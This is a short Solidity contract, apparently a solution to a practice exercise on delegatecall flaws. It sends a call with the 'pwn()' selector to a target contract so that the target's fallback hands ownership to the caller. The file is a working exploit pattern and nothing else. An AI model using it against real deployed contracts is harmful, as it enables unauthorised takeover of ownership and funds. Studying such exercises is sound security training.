pragma solidity ^0.6.0;

contract DelegationAttacker {

    address target;

    constructor(address _target) public {
        
        target = _target;
    }

    function attack() public {

        (bool sent, bytes memory data) = target.call(abi.encodeWithSignature("pwn()"));
    }
}